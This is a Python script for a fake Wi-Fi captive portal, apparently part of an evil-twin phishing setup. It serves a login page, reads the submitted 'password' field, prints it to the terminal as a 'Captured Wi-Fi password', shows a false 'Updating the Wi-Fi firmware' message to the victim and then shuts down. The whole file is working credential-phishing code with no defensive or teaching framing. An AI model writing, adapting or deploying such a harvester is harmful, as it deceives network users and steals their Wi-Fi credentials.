import urllib.parse as up
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading

# Define a simple HTTP server to serve the captive portal
class RequestHandler(BaseHTTPRequestHandler):

    # Handle GET request
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            # Open and serve the index.html file
            with open('index.html', 'rb') as file:
                self.wfile.write(file.read())

    # Handle POST request (when the user submits the form)
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        data = up.parse_qs(post_data)

        # Capture Wi-Fi password
        password = data.get('password', [''])[0]

        # Print the captured password in the terminal
        print(f"Captured Wi-Fi password: {password}")

        # Respond with a thank-you message
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<html><body><h1>Thank you! Updating the Wi-Fi firmware</h1></body></html>')

        # Shutdown the server after capturing the data
        threading.Thread(target=self.server.shutdown).start()

# Function to start the server
def run(server_class=HTTPServer, handler_class=RequestHandler, port=8080):  # Use port 8080
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting HTTP server on port {port}')
    httpd.serve_forever()

# Run the server on port 8080
run()
